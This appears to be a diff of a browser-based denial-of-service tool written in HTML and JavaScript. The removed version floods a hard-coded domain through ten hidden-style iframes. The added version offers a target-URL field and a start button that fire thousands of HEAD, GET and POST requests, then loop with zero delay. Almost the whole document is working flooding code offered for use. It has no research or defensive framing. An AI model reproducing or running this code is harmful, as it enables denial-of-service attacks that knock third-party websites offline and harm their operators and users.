@@ -3,88 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealth DDoS Attack</title>
+    <title>Aggressive DDoS Attack</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            height: 100%;
-            background: #f0f0f0;
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #282c34;
+            color: white;
+            text-align: center;
+            padding: 50px;
         }
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        input[type="text"], button {
+            padding: 10px;
+            margin: 5px;
+            font-size: 1em;
             border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="text"] {
+            width: 100%;
+            max-width: 400px;
+        }
+        button {
+            background: #61dafb;
+            color: #282c34;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #21a1f1;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: red;
+        }
+        #console {
+            margin-top: 20px;
+            background: #333;
+            padding: 10px;
+            border-radius: 5px;
+            max-height: 200px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
+    <h1>Aggressive DDoS Attack</h1>
+    <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
+    <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
+    <div id="status"></div>
+    <div id="console"></div>
+
     <script>
-        // Fungsi buat tempat iframe
-        function createAttackFrame() {
-            const iframe = document.createElement('iframe');
-            iframe.src = 'about:blank'; // Menggunakan about:blank untuk menghindari permintaan tambahan
-            iframe.style.position = 'absolute';
-            iframe.style.top = '0';
-            iframe.style.left = '0';
-            iframe.style.width = '100%';
-            iframe.style.height = '100%';
-            iframe.style.border = 'none';
-            iframe.style.display = 'block'; // Menyembunyikan iframe
-            document.body.appendChild(iframe);
+        let attackInterval;
+        let isAttacking = false;
 
-            iframe.onload = function() {
-                const doc = iframe.contentDocument || iframe.contentWindow.document;
-                doc.open();
-                doc.write(`
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <body>
-                        <script>
-                            function sendRequest(targetURL, method) {
-                                const xhr = new XMLHttpRequest();
-                                xhr.open(method, targetURL, true);
-                                xhr.onreadystatechange = function() {
-                                    if (xhr.readyState === 4) {
-                                        console.log(\`\${method} \${xhr.status}: \${xhr.responseURL}\`);
-                                    }
-                                };
-                                xhr.send();
-                            }
+        function toggleAttack() {
+            const attackButton = document.getElementById('attackButton');
+            const targetURL = document.getElementById('targetURL').value;
+            if (!targetURL) {
+                document.getElementById('status').innerText = 'Please enter a valid target URL.';
+                return;
+            }
 
-                            function startAttack(targetURL) {
-                                function attack() {
-                                    ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(targetURL, method));
-                                }
-
-                                // Burst awal 1000 permintaan untuk setiap metode
-                                for (let i = 0; i < 1000; i++) {
-                                    attack();
-                                }
-
-                                // Lakukan permintaan secara agresif
-                                setInterval(attack, 0);
-                            }
-
-                            // Ganti 'https://example.com' dengan URL target
-                            startAttack('https://setia.dewi11-pit.com');
-                        </script>
-                    </body>
-                    </html>
-                `);
-                doc.close();
-            };
+            if (!isAttacking) {
+                document.getElementById('status').innerText = 'Attack in progress...';
+                attackButton.innerText = 'Stop Attack';
+                isAttacking = true;
+                startAttack(targetURL);
+            } else {
+                document.getElementById('status').innerText = 'Attack stopped.';
+                attackButton.innerText = 'Start Attack';
+                isAttacking = false;
+                stopAttack();
+            }
         }
 
-        // Buat beberapa iframe untuk meningkatkan agresivitas serangan
-        for (let i = 0; i < 10; i++) {
-            createAttackFrame();
+        function startAttack(targetURL) {
+            function sendRequest(method) {
+                const xhr = new XMLHttpRequest();
+                xhr.open(method, targetURL, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
+                    }
+                };
+                xhr.send();
+            }
+
+            // Initial burst of 2000 requests for each method
+            for (let i = 0; i < 2000; i++) {
+                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
+            }
+
+            // Aggressive looping for each method
+            attackInterval = setInterval(() => {
+                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
+            }, 0);
+        }
+
+        function stopAttack() {
+            if (attackInterval) {
+                clearInterval(attackInterval);
+            }
+        }
+
+        function consoleOutput(message) {
+            const consoleDiv = document.getElementById('console');
+            const newMessage = document.createElement('div');
+            newMessage.textContent = message;
+            consoleDiv.appendChild(newMessage);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
         }
     </script>
 </body>
 </html>
-
